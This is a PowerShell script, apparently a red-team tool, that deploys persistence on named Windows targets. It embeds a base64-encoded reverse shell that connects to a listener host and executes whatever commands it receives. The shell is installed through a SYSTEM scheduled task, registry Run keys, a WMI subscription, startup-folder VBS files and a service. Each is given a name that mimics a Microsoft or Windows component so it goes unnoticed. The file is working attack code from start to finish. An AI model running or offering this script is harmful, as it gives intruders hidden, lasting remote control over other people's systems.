# windows_persist.ps1 — Multi-method Windows persistence deployer
# Targets: svc-ad-01 (Windows Server 2022 AD/DNS), svc-smb-01 (Windows 11)
# Run from a Red Team Kali box via: crackmapexec smb <ip> -u <user> -p <pass> -X "..."
# Or directly on a shell obtained on the target
# Methods: Scheduled Task, Registry Run key, WMI subscription, startup folder, service

param(
    [string]$LHost = "127.0.0.1",   # Red team listener IP — set before use
    [int]   $LPort = 4446,
    [string]$Method = "all"          # all | task | reg | wmi | startup | service
)

$ErrorActionPreference = "SilentlyContinue"

# ── Reverse shell payload (base64-encoded for cleanliness) ───────────────────
$RevShellCode = @"
`$c = New-Object System.Net.Sockets.TcpClient('$LHost',$LPort)
`$s = `$c.GetStream()
[byte[]]`$b = 0..65535|%{0}
while((`$i = `$s.Read(`$b,0,`$b.Length)) -ne 0){
    `$d = (New-Object Text.ASCIIEncoding).GetString(`$b,0,`$i)
    `$r = (iex `$d 2>&1 | Out-String)
    `$rb = ([Text.Encoding]::ASCII).GetBytes(`$r)
    `$s.Write(`$rb,0,`$rb.Length)
}
`$c.Close()
"@

$Bytes   = [System.Text.Encoding]::Unicode.GetBytes($RevShellCode)
$B64     = [Convert]::ToBase64String($Bytes)
$ExecCmd = "powershell.exe -NoP -NonI -W Hidden -Enc $B64"

function Write-Status($msg) { Write-Host "[*] $msg" -ForegroundColor Cyan }
function Write-Ok($msg)     { Write-Host "[+] $msg" -ForegroundColor Green }
function Write-Fail($msg)   { Write-Host "[-] $msg" -ForegroundColor Red }

Write-Status "=== Windows Persistence Deployer ==="
Write-Status "LHOST: $LHost  LPORT: $LPort"
Write-Host ""

# ── Method 1: Scheduled Task ─────────────────────────────────────────────────
function Install-ScheduledTask {
    Write-Status "[1] Installing scheduled task..."
    $Action  = New-ScheduledTaskAction -Execute "powershell.exe" `
                   -Argument "-NoP -NonI -W Hidden -Enc $B64"
    $Trigger = New-ScheduledTaskTrigger -RepetitionInterval (New-TimeSpan -Minutes 5) `
                   -Once -At (Get-Date)
    $Settings = New-ScheduledTaskSettingsSet -Hidden -AllowStartIfOnBatteries `
                    -DontStopIfGoingOnBatteries -StartWhenAvailable
    $Principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -RunLevel Highest

    Register-ScheduledTask -TaskName "MicrosoftEdgeUpdateCore" `
        -Action $Action -Trigger $Trigger `
        -Settings $Settings -Principal $Principal -Force | Out-Null

    if (Get-ScheduledTask -TaskName "MicrosoftEdgeUpdateCore" -EA SilentlyContinue) {
        Write-Ok "Scheduled task 'MicrosoftEdgeUpdateCore' installed (every 5 min as SYSTEM)"
    } else {
        Write-Fail "Scheduled task failed — may need SYSTEM/Admin"
    }
}

# ── Method 2: Registry Run Key ───────────────────────────────────────────────
function Install-RegRunKey {
    Write-Status "[2] Installing registry Run key..."
    $Paths = @(
        "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run",
        "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
    )
    foreach ($p in $Paths) {
        try {
            Set-ItemProperty -Path $p -Name "WindowsDefenderSvc" -Value $ExecCmd
            Write-Ok "Run key set at $p\WindowsDefenderSvc"
        } catch {
            Write-Fail "Failed at $p : $_"
        }
    }

    # Also try RunOnce for immediate next boot trigger
    try {
        Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce" `
            -Name "WinUpdateCheck" -Value $ExecCmd
        Write-Ok "RunOnce key set (fires on next login)"
    } catch {
        Write-Fail "RunOnce HKLM failed"
    }
}

# ── Method 3: WMI Event Subscription ─────────────────────────────────────────
function Install-WMISubscription {
    Write-Status "[3] Installing WMI event subscription..."
    try {
        $Filter = Set-WmiInstance -Class __EventFilter -Namespace "root\subscription" -Arguments @{
            Name           = "SysHealthMon"
            EventNameSpace = "root\cimv2"
            QueryLanguage  = "WQL"
            Query          = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 60"
        }
        $Consumer = Set-WmiInstance -Class CommandLineEventConsumer -Namespace "root\subscription" -Arguments @{
            Name             = "SysHealthConsumer"
            CommandLineTemplate = $ExecCmd
        }
        Set-WmiInstance -Class __FilterToConsumerBinding -Namespace "root\subscription" -Arguments @{
            Filter   = $Filter
            Consumer = $Consumer
        } | Out-Null
        Write-Ok "WMI subscription installed (fires every ~60s when system is up)"
    } catch {
        Write-Fail "WMI subscription failed: $_"
    }
}

# ── Method 4: Startup Folder ──────────────────────────────────────────────────
function Install-StartupFolder {
    Write-Status "[4] Dropping startup VBS in All Users startup folder..."
    $VbsPath = "$env:ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\svcmon.vbs"
    $Vbs = @"
Set ws = CreateObject("WScript.Shell")
ws.Run "$ExecCmd", 0, False
"@
    try {
        Set-Content -Path $VbsPath -Value $Vbs -Force
        Write-Ok "Startup VBS: $VbsPath"
    } catch {
        Write-Fail "Startup folder write failed: $_"
    }

    # Per-user startup as fallback
    $UserStartup = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\svcmon.vbs"
    try {
        Set-Content -Path $UserStartup -Value $Vbs -Force
        Write-Ok "User startup VBS: $UserStartup"
    } catch {
        Write-Fail "User startup folder write failed"
    }
}

# ── Method 5: Hidden Service via sc.exe ──────────────────────────────────────
function Install-Service {
    Write-Status "[5] Creating hidden Windows service..."
    # Write a simple batch launcher
    $BatPath = "C:\Windows\Temp\svchost_mon.bat"
    Set-Content -Path $BatPath -Value "@echo off`r`n$ExecCmd" -Force

    sc.exe create "WinSockHelper" binPath= "cmd.exe /c $BatPath" start= auto | Out-Null
    sc.exe description "WinSockHelper" "Windows Socket Support Helper" | Out-Null
    sc.exe start "WinSockHelper" | Out-Null

    if ((sc.exe query "WinSockHelper") -match "RUNNING|START") {
        Write-Ok "Service 'WinSockHelper' created and started"
    } else {
        Write-Fail "Service creation may have failed (check manually)"
    }
}

# ── Dispatch ─────────────────────────────────────────────────────────────────
switch ($Method.ToLower()) {
    "task"    { Install-ScheduledTask }
    "reg"     { Install-RegRunKey }
    "wmi"     { Install-WMISubscription }
    "startup" { Install-StartupFolder }
    "service" { Install-Service }
    default   {
        Install-ScheduledTask
        Install-RegRunKey
        Install-WMISubscription
        Install-StartupFolder
        Install-Service
    }
}

Write-Host ""
Write-Status "=== Complete ==="
Write-Host "    Start listener on Kali: nc -lvnp $LPort" -ForegroundColor Yellow
Write-Host "    All methods target LHOST=$LHost LPORT=$LPort" -ForegroundColor Yellow
